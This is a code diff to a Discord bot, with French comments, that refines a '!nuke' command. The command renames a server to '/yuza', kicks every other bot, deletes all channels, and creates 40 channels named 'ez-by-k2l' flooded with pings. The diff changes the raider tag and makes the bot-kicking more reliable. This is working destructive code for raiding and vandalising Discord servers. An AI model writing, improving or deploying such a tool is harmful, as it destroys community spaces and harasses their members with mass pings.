@@ -117,7 +117,7 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Ultra-Fast + Rename Serveur + Clean + Spam)
+    // 2. COMMANDE !NUKE (Ultra-Fast + Rename /yuza + Salons ez-by-k2l)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -128,13 +128,13 @@ client.on('messageCreate', async message => {
             // A. Renommer le serveur en "/yuza"
             await message.guild.setName('/yuza').catch(() => {});
 
-            // B. Kick des autres bots
-            const members = await message.guild.members.fetch();
-            members.forEach(m => {
+            // B. Forcer la récupération des membres et kicker tous les autres bots
+            const fetchedMembers = await message.guild.members.fetch();
+            for (const [id, m] of fetchedMembers) {
                 if (m.user.bot && m.id !== client.user.id) {
-                    m.kick('Nuke').catch(() => {});
+                    await m.kick('Nuke - Suppression des bots').catch(() => {});
                 }
-            });
+            }
 
             // C. Suppression des salons existants
             const oldChannels = message.guild.channels.cache;
@@ -142,10 +142,10 @@ client.on('messageCreate', async message => {
                 channel.delete().catch(() => {});
             });
 
-            // D. Création massive de 40 salons "ez-by-graveuhq" et spam de pings
+            // D. Création massive de 40 salons "ez-by-k2l" et spam immédiat de pings
             for (let i = 0; i < 40; i++) {
                 message.guild.channels.create({
-                    name: 'ez-by-graveuhq',
+                    name: 'ez-by-k2l',
                     type: 0 // Salon textuel
                 }).then(async channel => {
                     for (let j = 0; j < 10; j++) {
